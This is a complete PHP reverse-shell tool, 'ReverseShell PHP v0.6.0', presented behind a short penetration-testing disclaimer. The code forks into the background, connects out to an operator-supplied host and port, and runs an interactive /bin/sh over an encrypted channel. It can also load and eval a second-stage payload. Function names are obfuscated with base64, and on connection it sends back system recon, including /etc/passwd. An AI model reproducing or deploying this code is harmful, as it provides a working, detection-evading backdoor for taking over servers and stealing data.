<?php
/**
 * ReverseShell PHP v0.6.0 by J4ck3LSyN
 *
 * This software is for authorized penetration testing and educational purposes only.
 * Unauthorized use, distribution, or modification is strictly prohibited.
 * The author assumes no liability for any misuse or damage caused.
 * Always obtain proper written consent before testing systems.
 */

@set_time_limit(0);@ignore_user_abort(true);class ReverseShell{private $__ip='{RHOST}';private $__port={RPORT};private $__cs=1400;private $__cmd='L2Jpbi9zaCAtaQ==';private $__enc=true;private $__key;private $__met=false;private $__inf=true;private $__d=false;private $__s;private $__p=[];private $__f=['pcntl_fork'=>'cGNudGxfZm9yaw==','posix_setsid'=>'cG9zaXhfc2V0c2lk','fsockopen'=>'ZnNvY2tvcGVu','proc_open'=>'cHJvY19vcGVu','stream_select'=>'c3RyZWFtX3NlbGVjdA==','stream_set_blocking'=>'c3RyZWFtX3NldF9ibG9ja2luZw==','base64_decode'=>'YmFzZTY0X2RlY29kZQ==','openssl_encrypt'=>'b3BlbnNzbF9lbmNyeXB0','openssl_decrypt'=>'b3BlbnNzbF9kZWNyeXB0','random_bytes'=>'cmFuZG9tX2J5dGVz','proc_close'=>'cHJvY19jbG9zZQ==','function_exists'=>'ZnVuY3Rpb25fZXhpc3Rz','extension_loaded'=>'ZXh0ZW5zaW9uX2xvYWRlZA==','is_readable'=>'aXNfcmVhZGFibGU=','file_get_contents'=>'ZmlsZV9nZXRfY29udGVudHM=','php_uname'=>'cGhwX3VuYW1l','shell_exec'=>'c2hlbGxfZXhlYw=='];public function __construct($k='your_super_secret_32_byte_key!!'){$this->__key=$k;if($this->__enc&&!$this->_f('extension_loaded','openssl')){$this->__enc=false;$this->_l("Warning: openssl not found. Encryption disabled.");}}public function run(){$this->_f('pcntl_fork')&&exit();@chdir('/');@umask(0);$this->__s=$this->_f('fsockopen',$this->__ip,$this->__port,$e,$m,30)?:die("Error: $m ($e)");$this->__met?$this->_ms():$this->_sh();}private function _sh(){$d=[[0,'pipe','r'],[1,'pipe','w'],[2,'pipe','w']];$pr=$this->_f('proc_open',$this->b64d($this->__cmd),$d,$this->__p);if(!$pr){$this->_l("Error: Shell spawn failed");return;}$this->__inf&&$this->_gi();$this->_f('stream_set_blocking',$this->__p[0],0);$this->_f('stream_set_blocking',$this->__p[1],0);$this->_f('stream_set_blocking',$this->__p[2],0);$this->_f('stream_set_blocking',$this->__s,0);$this->_l("Connected to {$this->__ip}:{$this->__port}");while(1){if(feof($this->__s)||!is_resource($this->__s))break;if(feof($this->__p[1])&&feof($this->__p[2]))break;$r=[$this->__s,$this->__p[1],$this->__p[2]];if($this->_f('stream_select',$r,$w=$x=null,null)===false)break;if(in_array($this->__s,$r)){$i=fread($this->__s,$this->__cs);$d=$this->_d($i);strlen($d)>0&&fwrite($this->__p[0],$d);}if(in_array($this->__p[1],$r)){$o=fread($this->__p[1],$this->__cs);strlen($o)>0&&@fwrite($this->__s,$this->_e($o));}if(in_array($this->__p[2],$r)){$o=fread($this->__p[2],$this->__cs);strlen($o)>0&&@fwrite($this->__s,$this->_e($o));}}$this->_c($pr);}private function _ms(){$this->_l("Awaiting stage...");$l='';while(strlen($l)<4)$l.=fread($this->__s,4-strlen($l));$len=unpack('N',$l)[1];$s='';while(strlen($s)<$len)$s.=fread($this->__s,$len-strlen($s));$this->_l("Stage received");eval($s);@fclose($this->__s);}private function _gi(){$i=$this->_si();@fwrite($this->__s,$this->_e($i));}private function _f($n,...$a){$f=$this->b64d($this->__f[$n]??'');return $this->_f('function_exists',$f)?$f(...$a):0;}private function b64d($s){return base64_decode($s);}private function _e($d){if(!$this->__enc)return$d;if(strlen($this->__key)!=32)die("Error: Key must be 32 bytes");$iv=$this->_f('random_bytes',12);$t='';$c=$this->_f('openssl_encrypt',$d,'aes-256-gcm',$this->__key,OPENSSL_RAW_DATA,$iv,$t,'',16);return$c?$iv.$t.$c:false;}private function _d($d){if(!$this->__enc||strlen($d)<28)return$d;$iv=substr($d,0,12);$t=substr($d,12,16);$c=substr($d,28);return($iv&&$t)?$this->_f('openssl_decrypt',$c,'aes-256-gcm',$this->__key,OPENSSL_RAW_DATA,$iv,$t):'';}private function _si(){$p='/etc/passwd';return"\n================================================\n======= Initial System Recon =======\n================================================\n\n## User Info\nwhoami: {$this->_f('shell_exec','whoami')}\nid: {$this->_f('shell_exec','id')}\n\n## OS Info\n{$this->_f('php_uname','a')}\n\n## Network Info\n{$this->_f('shell_exec','/sbin/ifconfig 2>/dev/null || /bin/ip a 2>/dev/null')}\n\n## $p\n".($this->_f('is_readable',$p)?$this->_f('file_get_contents',$p):'Not Readable')."\n";}private function _l($m){!$this->__d&&print"$m\n";}private function _c($p){@fclose($this->__s);foreach($this->__p as $pi)@fclose($pi);@proc_close($p);}}(new ReverseShell())->run();
?>
